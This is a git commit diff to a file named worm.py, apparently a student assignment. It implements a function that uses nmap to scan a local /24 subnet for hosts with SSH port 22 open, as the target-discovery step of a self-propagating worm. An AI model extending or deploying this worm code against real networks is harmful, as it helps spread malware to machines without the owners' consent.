2821783aecaf13ef217ebce270ce04b96ba8557d
hectorRod101 <43355066+hectorRod101@users.noreply.github.com>
2019-10-10 15:57:50 -0700

    Update worm.py

--- worm.py
+++ worm.py
@@ -199,7 +199,31 @@ def getHostsOnTheSameNetwork():
 	# for hosts on the same network
 	# and return the list of discovered
 	# IP addresses.	
-	pass
+	# Create an instance of the port scanner class
+	portScanner = nmap.PortScanner()
+	
+	# Scan the network for systems whose
+	# port 22 is open (that is, there is possibly
+	# SSH running there). 
+	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
+		
+	# Scan the network for hoss
+	hostInfo = portScanner.all_hosts()	
+	
+	# The list of hosts that are up.
+	liveHosts = []
+	
+	# Go trough all the hosts returned by nmap
+	# and remove all who are not up and running
+	for host in hostInfo:
+		
+		# Is ths host up?
+		if portScanner[host].state() == "up":
+			liveHosts.append(host)
+	
+	
+		
+	return liveHosts
 
 #######################################################
 # Clean by removing the marker and copied worm program
